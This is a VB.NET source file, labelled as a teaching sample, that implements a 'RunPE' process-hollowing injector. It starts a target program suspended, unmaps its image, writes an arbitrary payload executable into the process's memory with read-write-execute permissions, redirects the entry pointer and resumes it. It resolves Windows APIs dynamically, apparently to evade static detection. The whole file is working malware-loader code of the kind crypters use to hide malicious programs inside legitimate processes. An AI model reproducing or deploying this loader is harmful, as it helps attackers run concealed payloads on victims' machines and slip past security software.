Class MenaPE

    '------------------------------
    'Title: MenaPE (RunPE Class)
    'Author: Menalix
    'Website: Menalix.com
    'Notice: For teaching purposes
    '------------------------------

#Region "Static API Calls"

    Declare Function LoadLibraryA Lib "kernel32" (ByVal Name As String) As IntPtr
    Declare Function GetProcAddress Lib "kernel32" (ByVal hProcess As IntPtr, ByVal Name As String) As IntPtr
#End Region

#Region "Dynamic API Caller"

    Private Function CreateApi(Of T)(ByVal Name As String, ByVal Method As String) As T
        Return DirectCast(DirectCast(Runtime.InteropServices.Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibraryA(Name), Method), GetType(T)), Object), T)
    End Function

#End Region

#Region "Dynamic API's"

    Private Delegate Function ReadProcessMemoryParameters(ByVal hProcess As UInteger, ByVal lpBaseAddress As IntPtr, ByRef lpBuffer As Integer, ByVal nSize As IntPtr, ByRef lpNumberOfBytesWritten As IntPtr) As Boolean
    ReadOnly ReadProcessMemory As ReadProcessMemoryParameters = CreateApi(Of ReadProcessMemoryParameters)("kernel32", "ReadProcessMemory")

    Private Delegate Function CreateProcessParameters(
    ByVal ApplicationName As String,
    ByVal CommandLine As String,
    ByVal ProcessAttributes As IntPtr,
    ByVal ThreadAttributes As IntPtr,
    ByVal InheritHandles As Boolean,
    ByVal CreationFlags As UInteger,
    ByVal Environment As IntPtr,
    ByVal CurrentDirectory As String,
    ByRef StartupInfo As STARTUPINFO,
    ByRef ProcessInformation As PROCESS_INFORMATION) As Boolean
    Dim CreateProcess As CreateProcessParameters = CreateApi(Of CreateProcessParameters)("kernel32", "CreateProcessA")

    Private Delegate Function NtQueryInformationProcessParameters(ByVal hProcess As IntPtr,
    ByVal ProcessInformationClass As Integer,
    ByRef ProcessInformation As PROCESS_BASIC_INFORMATION,
    ByVal ProcessInformationLength As UInteger,
    ByRef ReturnLength As UIntPtr) As UInteger
    ReadOnly NtQueryInformationProcess As NtQueryInformationProcessParameters = CreateApi(Of NtQueryInformationProcessParameters)("ntdll", "NtQueryInformationProcess")

    Private Delegate Function GetThreadContext64Parameters(
    ByVal hThread As IntPtr,
    ByRef lpContext As CONTEXT32) As Boolean
    Dim GetThreadContext64 As GetThreadContext64Parameters = Nothing

    Private Delegate Function IsWow64ProcessParameters(
    ByVal hProcess As IntPtr,
    ByRef Wow64Process As Boolean) As Boolean
    ReadOnly IsWow64Process As IsWow64ProcessParameters = CreateApi(Of IsWow64ProcessParameters)("kernel32", "IsWow64Process")

    Private Delegate Function WriteProcessMemoryParameters(
    ByVal hProcess As IntPtr,
    ByVal lpBaseAddress As IntPtr,
    ByVal lpBuffer As Byte(),
    ByVal nSize As UInteger,
    ByRef lpNumberOfBytesWritten As UInteger) As Boolean
    ReadOnly WriteProcessMemory As WriteProcessMemoryParameters = CreateApi(Of WriteProcessMemoryParameters)("kernel32", "WriteProcessMemory")

    Private Delegate Function NtUnmapViewOfSectionParameters(
    ByVal hProcess As IntPtr,
    ByVal pBaseAddress As IntPtr) As UInteger
    ReadOnly NtUnmapViewOfSection As NtUnmapViewOfSectionParameters = CreateApi(Of NtUnmapViewOfSectionParameters)("ntdll", "NtUnmapViewOfSection")

    Private Delegate Function VirtualAllocExParameters(
    ByVal hProcess As IntPtr,
    ByVal lpAddress As IntPtr,
    ByVal dwSize As UInteger,
    ByVal flAllocationType As UInteger,
    ByVal flProtect As UInteger) As IntPtr
    ReadOnly VirtualAllocEx As VirtualAllocExParameters = CreateApi(Of VirtualAllocExParameters)("kernel32", "VirtualAllocEx")

    Private Delegate Function ResumeThreadParameters(
    ByVal hThread As IntPtr) As UInteger
    ReadOnly ResumeThread As ResumeThreadParameters = CreateApi(Of ResumeThreadParameters)("kernel32", "ResumeThread")

#End Region

#Region "API Structures"
    Private Structure PROCESS_INFORMATION
        Public hProcess As IntPtr
        Public hThread As IntPtr
        Public dwProcessId As UInteger
        Public dwThreadId As UInteger
    End Structure
    Private Structure STARTUPINFO
        Public cb As UInteger
        Public lpReserved As String
        Public lpDesktop As String
        Public lpTitle As String
        <Runtime.InteropServices.MarshalAs(Runtime.InteropServices.UnmanagedType.ByValArray, SizeConst:=36)>
        Public Misc As Byte()
        Public lpReserved2 As Byte
        Public hStdInput As IntPtr
        Public hStdOutput As IntPtr
        Public hStdError As IntPtr
    End Structure
    Structure FLOATING_SAVE_AREA
        Dim Control, Status, Tag, ErrorO, ErrorS, DataO, DataS As UInteger
        <System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.ByValArray, SizeConst:=80)> Dim RegisterArea As Byte()
        Dim State As UInteger
    End Structure
    Structure CONTEXT32
        Dim ContextFlags, Dr0, Dr1, Dr2, Dr3, Dr6, Dr7 As UInteger
        Dim FloatSave As FLOATING_SAVE_AREA
        Dim SegGs, SegFs, SegEs, SegDs, Edi, Esi, Ebx, Edx, Ecx, Eax, Ebp, Eip, SegCs, EFlags, Esp, SegSs As UInteger
        <System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.ByValArray, SizeConst:=512)> Dim ExtendedRegisters As Byte()
    End Structure
    Structure PROCESS_BASIC_INFORMATION
        Public ExitStatus As IntPtr
        Public PebBaseAddress As IntPtr
        Public AffinityMask As IntPtr
        Public BasePriority As IntPtr
        Public UniqueProcessID As IntPtr
        Public InheritedFromUniqueProcessId As IntPtr
    End Structure
#End Region

#Region "Injection"

    Public Function Run(ByVal path As String, ByVal payload As Byte(), ByVal creationflag As Integer) As Boolean
        For I As Integer = 1 To 5
            If HandleRun(path, payload, creationflag) Then Return True
        Next
        Return False
    End Function

    Private Function HandleRun(ByVal Path As String, ByVal payload As Byte(), ByVal creationflag As Integer) As Boolean
        Dim ReadWrite As Integer = Nothing
        Dim QuotedPath As String = String.Format("""{0}""", Path)

        Dim SI As New STARTUPINFO
        Dim PI As New PROCESS_INFORMATION

        SI.cb = CUInt(Runtime.InteropServices.Marshal.SizeOf(GetType(STARTUPINFO))) 'Parses the size of the structure to the structure, so it retrieves the right size of data

        Try
            'COMMENT: Creating a target process in suspended state, which makes it patch ready and we also retrieves its process information and startup information.
            If Not CreateProcess(Path, QuotedPath, IntPtr.Zero, IntPtr.Zero, True, creationflag, IntPtr.Zero, IO.Directory.GetCurrentDirectory, SI, PI) Then Throw New Exception()

            'COMMENT: Defines some variables we need in the next process
            Dim ProccessInfo As New PROCESS_BASIC_INFORMATION
            Dim RetLength As UInteger
            Dim Context = Nothing
            Dim PEBAddress32 As Integer = Nothing
            Dim PEBAddress64 As Int64 = Nothing
            Dim TargetIs64 As Boolean = Nothing
            Dim IsWow64Proc As Boolean = False

            IsWow64Process(PI.hProcess, IsWow64Proc) 'COMMENT: Retrieves Boolean to know if target process is a 32bit process running in 32bit system, or a 32bit process running under WOW64 in a 64bit system.
            If IsWow64Proc Or IntPtr.Size = 4 Then 'COMMENT: Checks the Boolean retrieved from before OR checks if our calling process is 32bit
                Context = New CONTEXT32
                Context.ContextFlags = &H1000002L 'COMMENT: Parses the context flag CONTEXT_AMD64(&H00100000L) + CONTEXT_INTEGER(0x00000002L) to tell that we want a structure of a 32bit process running under WOW64, you can see all context flags in winnt.h header file.
                If IsWow64Proc AndAlso IntPtr.Size = 8 Then 'COMMENT: Checks if our own process is 64bit and the target process is 32bit in wow64
                    GetThreadContext64 = CreateApi(Of GetThreadContext64Parameters)("kernel32", "Wow64GetThreadContext") 'COMMENT: Retrieves a structure of information to retrieve the PEBAddress to later on know where we gonna use WriteProcessMemory to write our payload
                    If Not GetThreadContext64(PI.hThread, Context) Then Throw New Exception
                    Console.WriteLine(Context.Ebx)
                    PEBAddress32 = Context.Ebx
                    TargetIs64 = False
                Else 'COMMENT: If our process is 32bit and the target process is 32bit we get here. 
                    NtQueryInformationProcess(PI.hProcess, 0, ProccessInfo, Runtime.InteropServices.Marshal.SizeOf(ProccessInfo), RetLength) 'COMMENT: Retrieves a structure of information to retrieve the PEBAddress to later on know where we gonna use WriteProcessMemory to write our payload
                    PEBAddress32 = ProccessInfo.PebBaseAddress
                    TargetIs64 = False
                End If
            Else 'COMMENT: If our process is 64bit and the target process is 64bit we get here. 
                NtQueryInformationProcess(PI.hProcess, 0, ProccessInfo, Runtime.InteropServices.Marshal.SizeOf(ProccessInfo), RetLength) 'COMMENT: Retrieves a structure of information to retrieve the PEBAddress to later on know where we gonna use WriteProcessMemory to write our payload
                PEBAddress64 = ProccessInfo.PebBaseAddress
                TargetIs64 = True
            End If


            Dim BaseAddress As IntPtr
            If TargetIs64 = True Then
                ReadProcessMemory(PI.hProcess, PEBAddress64 + &H10, BaseAddress, 4, ReadWrite) 'COMMENT: Reads the BaseAddress of a 64bit Process, which is where the exe data starts
            Else
                ReadProcessMemory(PI.hProcess, PEBAddress32 + &H8, BaseAddress, 4, ReadWrite) 'COMMENT: Reads the BaseAddress of a 32bit Process, which is where the exe data starts
            End If

            Dim PayloadIs64 As Boolean = False
            Dim dwPEHeaderAddress As Integer = BitConverter.ToInt32(payload, &H3C) 'COMMENT: Gets the PEHeader start address
            Dim dwNetDirFlags As Integer = BitConverter.ToInt32(payload, dwPEHeaderAddress + &H398) 'COMMENT: Gets the .NET Header Flags value to determine if its a AnyCPU Compiled exe or not
            Dim wMachine As Integer = BitConverter.ToInt16(payload, dwPEHeaderAddress + &H4) 'COMMENT: Gets the reads the Machine value

            If wMachine = 8664 Then : PayloadIs64 = True 'Checks the Machine value to know if payload is 64bit or not"
            Else : PayloadIs64 = False : End If

            If PayloadIs64 = False Then
                If dwNetDirFlags = &H3 Then 'To make sure we don't rewrite flags on a Payload which is already AnyCPU Compiled, it will only slow us down
                    Buffer.SetByte(payload, dwPEHeaderAddress + &H398, &H1) 'Replaces the .NET Header Flag on a 32bit compiled payload, to make it possible doing 32bit -> 64bit injection
                End If
            End If

            Dim dwImageBase As Integer
            If PayloadIs64 = True Then
                dwImageBase = BitConverter.ToInt32(payload, dwPEHeaderAddress + &H30) 'Reads the ImageBase value of a 64bit payload, it's kind of unnessecary as ImageBase should always be: &H400000, this is the virtual addressstart location for our exe in its own memory space
            Else
                dwImageBase = BitConverter.ToInt32(payload, dwPEHeaderAddress + &H34) 'Reads the ImageBase value of a 32bit payload, it's kind of unnessecary as ImageBase should always be: &H400000, this is the virtual address start location for our exe in its own memory space
            End If

            If dwImageBase = BaseAddress Then 'COMMENT: If the BaseAddress of our Exe is matching the ImageBase, it's because it's mapped and we have to unmap it
                If Not NtUnmapViewOfSection(PI.hProcess, BaseAddress) = 0 Then Throw New Exception() 'COMMENT: Unmapping it
            End If

            Dim dwSizeOfImage As Integer = BitConverter.ToInt32(payload, dwPEHeaderAddress + &H50)
            Dim dwNewImageBase As Integer = VirtualAllocEx(PI.hProcess, dwImageBase, dwSizeOfImage, &H3000, &H40) 'COMMENT: Makes the process ready to write in by specifying how much space we need to do it and where we need it
            If dwNewImageBase = 0 Then Throw New Exception()

            Dim dwSizeOfHeaders As Integer = BitConverter.ToInt32(payload, dwPEHeaderAddress + &H54)
            If Not WriteProcessMemory(PI.hProcess, dwNewImageBase, payload, dwSizeOfHeaders, ReadWrite) Then Throw New Exception() 'Writes the size of the payloads PE header to the target

            'COMMENT: This is here where most of the magic happens. We write in all our sections data, which contains our resssources, code and the information to utilize the sections: VirtualAddress, SizeOfRawData and PointerToRawData
            Dim SizeOfOptionalHeader As Short = BitConverter.ToInt16(payload, dwPEHeaderAddress + &H14)
            Dim SectionOffset As Integer = dwPEHeaderAddress + (&H16 + SizeOfOptionalHeader + &H2)
            Dim NumberOfSections As Short = BitConverter.ToInt16(payload, dwPEHeaderAddress + &H6)
            For I As Integer = 0 To NumberOfSections - 1
                Dim VirtualAddress As Integer = BitConverter.ToInt32(payload, SectionOffset + &HC)
                Dim SizeOfRawData As Integer = BitConverter.ToInt32(payload, SectionOffset + &H10)
                Dim PointerToRawData As Integer = BitConverter.ToInt32(payload, SectionOffset + &H14)
                If Not SizeOfRawData = 0 Then
                    Dim SectionData(SizeOfRawData - 1) As Byte
                    Buffer.BlockCopy(payload, PointerToRawData, SectionData, 0, SectionData.Length)
                    If Not WriteProcessMemory(PI.hProcess, dwNewImageBase + VirtualAddress, SectionData, SectionData.Length, ReadWrite) Then Throw New Exception()
                End If
                SectionOffset += &H28
            Next

            Dim PointerData As Byte() = BitConverter.GetBytes(dwNewImageBase)
            If TargetIs64 = True Then
                If Not WriteProcessMemory(PI.hProcess, PEBAddress64 + &H10, PointerData, 4, ReadWrite) Then Throw New Exception() 'Writes the new etrypoint for 64bit target
            Else
                If Not WriteProcessMemory(PI.hProcess, PEBAddress32 + &H8, PointerData, 4, ReadWrite) Then Throw New Exception() 'Writes the new entrypoint for 32bit target
            End If
            If ResumeThread(PI.hThread) = -1 Then Throw New Exception() 'Resumes the suspended target with all its new exciting data

        Catch ex As Exception
            Dim P As Process = Process.GetProcessById(CInt(PI.dwProcessId))
            If P IsNot Nothing Then P.Kill()
            Return False
        End Try

        Return True
    End Function
#End Region

End Class